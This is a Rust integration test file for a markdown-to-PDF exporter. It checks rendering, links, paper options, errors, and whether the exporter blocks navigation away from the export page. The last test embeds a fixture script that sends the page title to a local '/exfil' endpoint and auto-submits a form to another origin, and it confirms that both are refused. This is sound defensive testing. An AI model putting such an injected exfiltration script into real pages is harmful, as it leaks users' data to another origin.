//! `mbr --pdf` end to end: the real binary, a hidden webview, the platform's
//! print-to-PDF, and the result read back with lopdf.
//!
//! Needs a desktop session and a platform backend (macOS today), so it runs
//! only with `MBR_PDF_TESTS=1`; otherwise each test prints why it skipped.
//! It also needs the front end built (`cd components && bun run build`), whose
//! `export-ready.ts` tells the exporter when the page is ready.

use std::path::{Path, PathBuf};
use std::process::Command;

use lopdf::{Document, Object};

fn enabled() -> bool {
    if std::env::var("MBR_PDF_TESTS").as_deref() == Ok("1") {
        true
    } else {
        eprintln!(
            "skipped: set MBR_PDF_TESTS=1 to run the PDF export tests (they open a hidden \
             webview and need a desktop session)"
        );
        false
    }
}

fn fixture() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/pdf-export")
}

/// Runs `mbr --pdf <note> <extra…>` with quiet logs; returns the status and
/// stderr.
fn mbr_pdf(note: &Path, extra: &[&str]) -> (std::process::ExitStatus, String, Vec<u8>) {
    let output = Command::new(env!("CARGO_BIN_EXE_mbr"))
        .arg("--pdf")
        .arg(note)
        .args(extra)
        .env_remove("RUST_LOG")
        .output()
        .expect("run mbr");
    (
        output.status,
        String::from_utf8_lossy(&output.stderr).into_owned(),
        output.stdout,
    )
}

/// Every URI a link annotation in the document points at.
fn link_uris(doc: &Document) -> Vec<String> {
    let mut uris = Vec::new();
    for page in doc.get_pages().values() {
        let Ok(annotations) = doc.get_page_annotations(*page) else {
            continue;
        };
        for annotation in annotations {
            let action = match annotation.get(b"A") {
                Ok(Object::Reference(id)) => doc.get_dictionary(*id).ok(),
                Ok(Object::Dictionary(dict)) => Some(dict),
                _ => None,
            };
            // Quartz writes the URI as an indirect string.
            let uri = action
                .and_then(|a| a.get(b"URI").ok())
                .and_then(|uri| doc.dereference(uri).ok())
                .map(|(_, uri)| uri);
            if let Some(Object::String(bytes, _)) = uri {
                uris.push(String::from_utf8_lossy(bytes).into_owned());
            }
        }
    }
    uris
}

/// The number of image XObjects drawn on any page.
fn image_count(doc: &Document) -> usize {
    doc.objects
        .values()
        .filter_map(|object| object.as_stream().ok())
        .filter(|stream| {
            stream
                .dict
                .get(b"Subtype")
                .and_then(Object::as_name)
                .is_ok_and(|name| name == b"Image")
        })
        .count()
}

fn page_text(doc: &Document) -> String {
    let pages: Vec<u32> = doc.get_pages().keys().copied().collect();
    doc.extract_text(&pages).unwrap_or_default()
}

#[test]
fn exports_a_note_with_everything_rendered() {
    if !enabled() {
        return;
    }
    let out = tempfile::tempdir().expect("tempdir");
    let target = out.path().join("fixture.pdf");
    let (status, stderr, _) = mbr_pdf(
        &fixture().join("note.md"),
        &["--output", target.to_str().expect("utf-8 path")],
    );
    assert!(status.success(), "mbr --pdf failed: {status}\n{stderr}");
    assert!(
        !stderr.contains("did not finish rendering"),
        "the page never reported ready (is the front end built?):\n{stderr}"
    );

    let bytes = std::fs::read(&target).expect("the PDF exists");
    assert!(bytes.starts_with(b"%PDF-"), "not a PDF");
    let doc = Document::load_mem(&bytes).expect("lopdf reads it");
    assert!(!doc.get_pages().is_empty(), "at least one page");

    let text = page_text(&doc);
    for marker in [
        "TOPMARKER",
        "CODEMARKER",
        "TABLEMARKER",
        "MERMAIDSTART",
        "BOTTOMMARKER",
    ] {
        assert!(text.contains(marker), "{marker} missing from:\n{text}");
    }
    assert!(
        !text.contains("graph LR"),
        "mermaid was printed as source, not as a diagram"
    );

    let uris = link_uris(&doc);
    assert!(
        uris.iter()
            .any(|uri| uri.starts_with("https://example.com/mbr-pdf-test")),
        "the external link is clickable: {uris:?}"
    );
    assert!(
        !uris
            .iter()
            .any(|uri| uri.contains("127.0.0.1") || uri.contains("localhost")),
        "no link points at the export's own server: {uris:?}"
    );

    assert!(
        image_count(&doc) >= 1,
        "the lazy image far below the fold was loaded and printed"
    );

    // Nothing but the PDF is left in the folder (the temporary file is gone).
    let names: Vec<_> = std::fs::read_dir(out.path())
        .expect("read_dir")
        .map(|e| e.expect("entry").file_name())
        .collect();
    assert_eq!(names, vec![std::ffi::OsString::from("fixture.pdf")]);
}

#[test]
fn exports_to_stdout_and_honours_paper_options() {
    if !enabled() {
        return;
    }
    let (status, stderr, stdout) = mbr_pdf(
        &fixture().join("other.md"),
        &["--output", "-", "--pdf-paper", "a4", "--pdf-landscape"],
    );
    assert!(status.success(), "{stderr}");
    let doc = Document::load_mem(&stdout).expect("stdout is the PDF");
    let first = *doc.get_pages().values().next().expect("a page");
    let media_box = doc
        .get_dictionary(first)
        .and_then(|page| page.get(b"MediaBox"))
        .and_then(Object::as_array)
        .expect("a media box")
        .iter()
        .map(|n| {
            n.as_float()
                .map(f64::from)
                .or_else(|_| n.as_i64().map(|i| i as f64))
        })
        .collect::<Result<Vec<f64>, _>>()
        .expect("numbers");
    let (width, height) = (media_box[2] - media_box[0], media_box[3] - media_box[1]);
    assert!(
        (width - 841.89).abs() < 1.0 && (height - 595.28).abs() < 1.0,
        "A4 landscape, got {width} x {height}"
    );
}

#[test]
fn a_missing_output_folder_fails_clearly() {
    if !enabled() {
        return;
    }
    let out = tempfile::tempdir().expect("tempdir");
    let missing = out.path().join("missing/x.pdf");
    let (status, stderr, _) = mbr_pdf(
        &fixture().join("other.md"),
        &["--output", missing.to_str().expect("utf-8")],
    );
    // Refused before starting: 2, not 1 ("the export failed").
    assert_eq!(status.code(), Some(2), "{stderr}");
    assert!(stderr.contains("does not exist"), "{stderr}");
}

/// A tiny HTTP server on another origin (another port) that answers every
/// request with a page saying `LEFTMARKER` and counts the requests.
fn spawn_sink_server() -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
    use std::io::{Read, Write};
    use std::sync::Arc;
    use std::sync::atomic::{AtomicUsize, Ordering};

    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
    let port = listener.local_addr().expect("addr").port();
    let hits = Arc::new(AtomicUsize::new(0));
    let counter = Arc::clone(&hits);
    // Left running for the rest of the test process.
    std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            counter.fetch_add(1, Ordering::SeqCst);
            let mut request = [0_u8; 4096];
            let _ = stream.read(&mut request);
            let body = "<!doctype html><title>left</title><p>LEFTMARKER</p>";
            let _ = write!(
                stream,
                "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\
                 Connection: close\r\n\r\n{body}",
                body.len()
            );
        }
    });
    (port, hits)
}

/// A note's script cannot take the export page (and what it read from the
/// server) to another origin: the navigation is refused before any request,
/// the page stays and is the one printed. (Measured on macOS: after a refused
/// navigation started while the page is still parsing, as here, the page never
/// reports ready and the export goes ahead at the timeout; one started later
/// does not delay it.)
#[test]
fn a_script_cannot_navigate_the_export_away() {
    if !enabled() {
        return;
    }
    let (port, hits) = spawn_sink_server();
    let repo = tempfile::tempdir().expect("tempdir");
    std::fs::create_dir(repo.path().join(".mbr")).expect("mkdir .mbr");
    let note = repo.path().join("leave.md");
    std::fs::write(
        &note,
        format!(
            "# Navigation test\n\n\
             STAYMARKER: a note whose script tries to leave the export page.\n\n\
             <form id=\"f\" method=\"post\" action=\"http://127.0.0.1:{port}/form\">\
             <input name=\"d\" value=\"x\"></form>\n\n\
             <script>\n\
             location.href = 'http://127.0.0.1:{port}/exfil?d=' + encodeURIComponent(document.title);\n\
             setTimeout(function () {{ document.getElementById('f').submit(); }}, 50);\n\
             </script>\n"
        ),
    )
    .expect("write note");
    let target = repo.path().join("leave.pdf");
    let (status, stderr, _) = mbr_pdf(
        &note,
        &[
            "--output",
            target.to_str().expect("utf-8 path"),
            "--pdf-timeout-ms",
            "10000",
        ],
    );
    assert!(status.success(), "mbr --pdf failed: {status}\n{stderr}");
    for path in ["exfil?d=", "form"] {
        assert!(
            stderr.contains(&format!(
                "tried to navigate to http://127.0.0.1:{port}/{path}"
            )),
            "the navigation to /{path} was not refused:\n{stderr}"
        );
    }
    assert_eq!(
        hits.load(std::sync::atomic::Ordering::SeqCst),
        0,
        "the other origin was asked for something:\n{stderr}"
    );
    let doc = Document::load_mem(&std::fs::read(&target).expect("the PDF exists"))
        .expect("lopdf reads it");
    let text = page_text(&doc);
    assert!(
        text.contains("STAYMARKER") && !text.contains("LEFTMARKER"),
        "the printed page is not the note:\n{text}"
    );
}
